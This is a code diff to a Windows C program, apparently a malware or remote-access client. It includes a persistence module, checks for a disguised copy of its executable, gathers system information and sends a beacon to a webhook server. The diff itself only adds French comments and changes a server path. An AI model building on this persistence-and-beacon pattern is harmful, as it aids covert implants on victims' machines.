@@ -9,7 +9,9 @@
 #include "persistance.c"
 
 #include "../include/http.h"
-#include "../include/structures.h"
+
+// structure COMPUTER_INFOS
+#include "../include/structures.h" 
 
 /*
 LISTE FONCTIONS EXTERNES UTILES A CE FICHIER
@@ -33,7 +35,7 @@ int is_first_execution(char *current_executable_path, char *softwareDataDirector
 
     char fake_executable_path[256];
     snprintf(fake_executable_path, 256, "%s\\%s", softwareDataDirectory, fake_executable_name);
-    return _access(fake_executable_path, 0); // de io.h
+    return _access(fake_executable_path, 0); // de io.h, pour vérifier si le fichier existe
 
 };
 
@@ -44,6 +46,8 @@ int main(void){
     char current_executable_path[MAX_PATH];
     GetModuleFileName(NULL, current_executable_path, MAX_PATH);
 
+
+    // COMPUTER_INFOS est une structure de ../include/structures.h
     COMPUTER_INFOS computer;
     get_computer_info(&computer);
 
@@ -71,7 +75,7 @@ int main(void){
     printf("Windows Version: %s\n", computer.windows_version);
     printf("Architecture: %s\n\n", computer.architecture);
 
-    send_to_server("/webhook/client.php", "{\"client_id\":1}");
+    send_to_server("webhook/client.php", "{\"client_id\":1}");
     
     return 0;
 }
